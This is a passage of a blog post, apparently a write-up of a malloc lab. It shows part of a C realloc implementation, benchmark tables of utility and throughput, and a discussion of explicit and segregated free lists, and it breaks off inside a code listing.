&gt;= asize) {</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* new_bp = mm_malloc(size);</span><br><span class="line">        <span class="keyword">if</span> (new_bp == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memcpy</span>(new_bp, bp, osize - SWORD);</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> new_bp;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Utility seems to be marginally better but the throughput is terribly
bad. We must turn to some more efficient allocating data structures.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.004449  1280</span><br><span class="line"> 1       yes   99%    5848  0.004395  1331</span><br><span class="line"> 2       yes   99%    6648  0.007329   907</span><br><span class="line"> 3       yes  100%    5380  0.005301  1015</span><br><span class="line"> 4       yes   66%   14400  0.000058249567</span><br><span class="line"> 5       yes   95%    4800  0.005649   850</span><br><span class="line"> 6       yes   94%    4800  0.005361   895</span><br><span class="line"> 7       yes   55%   12000  0.056433   213</span><br><span class="line"> 8       yes   51%   24000  0.181652   132</span><br><span class="line"> 9       yes   31%   14401  0.026830   537</span><br><span class="line">10       yes   30%   14401  0.000816 17655</span><br><span class="line">11       yes   77%   57716  0.965589    60</span><br><span class="line">12       yes   78%  100000  1.950844    51</span><br><span class="line">13       yes   99%   20000  0.000813 24585</span><br><span class="line">14       yes   71%  200400  0.104944  1910</span><br><span class="line">15       yes   58%    6495  0.014209   457</span><br><span class="line">Total          75%  496983  3.334673   149</span><br><span class="line"></span><br><span class="line">Perf index = 45 (util) + 10 (thru) = 55/100</span><br></pre></td></tr></table></figure>
<p><strong>Explicit + Deferred Coalesce + Better Hit</strong></p>
<p>We then replace the implicit linked list with an explicit linked
list, also with deferred coalesce and a better hit strategy to find a
free block. Better hit means that when the first valid free block is
hit, we then search the next <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span> free
blocks and select the smallest valid free block. <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span> is set to <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="3.394ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 1500 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container></span> by default.</p>
<p>The final score is 69 for this version. A significant improvement,
but still not enough.</p>
<p><strong>Seglist + Deferred Coalesce + Better Hit</strong></p>
<p>To further improve utility and throughput, we must employ the
segregate linked list. The lists are partitioned according to their
sizes: <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="44.348ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 19601.7 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1333.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(2333.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(2611.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3056.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(3445.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(4890,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(5890,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(6168,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(6612.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7001.7,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(8001.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(8446.3,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(9446.3,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(9724.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(10169,0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(11507.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(11952.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(12341.3,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(13631.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(14076.1,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(15366.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(15644.2,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(16088.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(16477.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(17768,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(18212.7,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g><g data-mml-node="mo" transform="translate(19212.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>. Deferred coalesce and
better hit are still used.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 